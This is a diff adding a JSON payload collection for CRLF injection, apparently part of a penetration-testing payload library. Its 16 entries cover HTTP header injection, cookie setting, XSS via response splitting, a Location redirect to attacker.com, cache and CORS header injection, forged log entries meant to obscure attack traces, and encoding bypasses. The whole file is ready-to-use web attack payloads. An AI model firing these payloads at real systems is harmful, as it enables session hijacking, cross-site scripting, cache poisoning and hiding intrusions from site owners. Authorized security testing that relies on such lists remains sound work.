@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "name": "CRLF Injection",
+    "icon": "📬",
+    "description": "CRLF (Carriage Return Line Feed) injection payloads for HTTP header injection, response splitting, cache poisoning, and log injection. \\r\\n shown as literal sequences.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 16
+  },
+  "payloads": [
+    {"id":1,"code":"%0d%0aHeader: injected","description":"URL-encoded CRLF header injection — %0d=CR, %0a=LF; injects custom header","category":"header-injection","platform":["any"],"tags":["crlf","header","injection","url-encoded"]},
+    {"id":2,"code":"%0aHeader: injected","description":"LF-only injection — some servers accept LF without CR for header splitting","category":"header-injection","platform":["any"],"tags":["crlf","lf-only","header","injection"]},
+    {"id":3,"code":"%0d%0aSet-Cookie: session=evil","description":"Cookie injection via CRLF — injects arbitrary cookie into response","category":"header-injection","platform":["any"],"tags":["crlf","cookie","injection","session"]},
+    {"id":4,"code":"%0d%0aX-Forwarded-For: 127.0.0.1","description":"XFF header injection via CRLF — may bypass IP-based access controls","category":"header-injection","platform":["any"],"tags":["crlf","xff","header","bypass"]},
+    {"id":5,"code":"%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>","description":"CRLF to XSS — injects content-type and body for XSS via response splitting","category":"header-injection","platform":["any"],"tags":["crlf","xss","response-splitting","content-type"]},
+
+    {"id":6,"code":"%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Fake page</html>","description":"HTTP response splitting — injects full fake HTTP response to poison next response","category":"response-splitting","platform":["any"],"tags":["crlf","response-splitting","http","fake-response"]},
+    {"id":7,"code":"%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>","description":"Advanced response splitting — sets Content-Length: 0 to terminate first response, starts new one","category":"response-splitting","platform":["any"],"tags":["crlf","response-splitting","content-length"]},
+    {"id":8,"code":"%0d%0aLocation: https://attacker.com%0d%0a","description":"CRLF-based redirect injection — injects Location header for open redirect","category":"response-splitting","platform":["any"],"tags":["crlf","redirect","location","injection"]},
+
+    {"id":9,"code":"%0d%0aCache-Control: no-cache, no-store%0d%0a","description":"Cache-Control injection — disable caching via CRLF to affect CDN/proxy behavior","category":"cache-poisoning","platform":["any"],"tags":["crlf","cache","cache-control","injection"]},
+    {"id":10,"code":"%0d%0aX-Cache-Key: %0d%0a","description":"Cache key poisoning via CRLF — injects invalid cache key to disrupt caching","category":"cache-poisoning","platform":["any"],"tags":["crlf","cache","cache-key","poisoning"]},
+    {"id":11,"code":"%0d%0aVary: Origin%0d%0aAccess-Control-Allow-Origin: *","description":"CORS header injection via CRLF — injects permissive CORS headers into response","category":"cache-poisoning","platform":["any"],"tags":["crlf","cors","injection","origin"]},
+
+    {"id":12,"code":"127.0.0.1 - admin [01/Jan/2024:00:00:00 +0000] \"GET /admin HTTP/1.1\" 200 0","description":"Log injection payload — injects fake access log entry to obscure attack traces","category":"log-injection","platform":["any"],"tags":["crlf","log","injection","forging"]},
+    {"id":13,"code":"%0a127.0.0.1 admin GET /secret 200","description":"URL-encoded newline log injection — single LF to inject into log files","category":"log-injection","platform":["any"],"tags":["crlf","log","lf","injection"]},
+
+    {"id":14,"code":"%E5%98%8A%E5%98%8DSet-Cookie: evil=1","description":"Unicode U+560A/U+560D CRLF bypass — some frameworks normalize these Unicode chars to CRLF","category":"bypass","platform":["any"],"tags":["crlf","unicode","bypass","u560a"]},
+    {"id":15,"code":"%23%0d%0aHeader: injected","description":"Fragment + CRLF combination — # truncates URL in client but server sees injected header","category":"bypass","platform":["any"],"tags":["crlf","fragment","bypass"]},
+    {"id":16,"code":"\\r\\nHeader: injected","description":"Literal backslash-r-n — some frameworks interpret \\r\\n as CRLF in header values","category":"bypass","platform":["any"],"tags":["crlf","literal","bypass","backslash"]}
+  ]
+}
